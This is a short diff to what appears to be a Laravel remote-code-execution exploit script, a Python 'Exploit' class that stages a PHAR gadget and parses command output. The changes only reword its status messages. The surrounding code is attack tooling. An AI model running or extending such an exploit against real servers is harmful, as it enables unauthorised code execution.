@@ -106,7 +106,7 @@ class Exploit:
         wrapper = self.get_write_filter()
         r = self.run_wrapper(wrapper)
         if r.status_code == 200:
-            print(f'{colors.OKGREEN} [RCE STAGING]: {colors.HEADER}Successfully converted to PHAR (Default laravel gadget with id command)!')
+            print(f'{colors.OKGREEN} [RCE STAGING]: {colors.HEADER}Successfully converted to PHAR (Default laravel gadget)!')
         else:
             print(f'{colors.FAIL} [RCE STAGING]: {colors.HEADER}Convertion to PHAR failed (try again ?)!')
 
@@ -120,9 +120,9 @@ class Exploit:
         match = re.search('^(.*?)\n<!doctype html>\n<html class="', r.text, flags=re.S)
 
         if match:
-            print(f'{colors.OKGREEN} [RCE COMMAND OUTPUT]: {colors.HEADER} {match.group(1)}')
+            print(f'{colors.OKGREEN} [RCE COMMAND OUTPUT]: \n{colors.HEADER} {match.group(1)}')
         elif 'phar error: write operations' in r.text:
-            print(f'{colors.OKGREEN} [RCE COMMAND OUTPUT]: {colors.HEADER} Exploit succeeded without output (phar error: write operations)')
+            print(f'{colors.OKGREEN} [RCE COMMAND OUTPUT]: \n{colors.HEADER} Exploit succeeded without output (phar error: write operations)')
         else:
             print(f'{colors.FAIL} [RCE COMMAND OUTPUT]:')
 
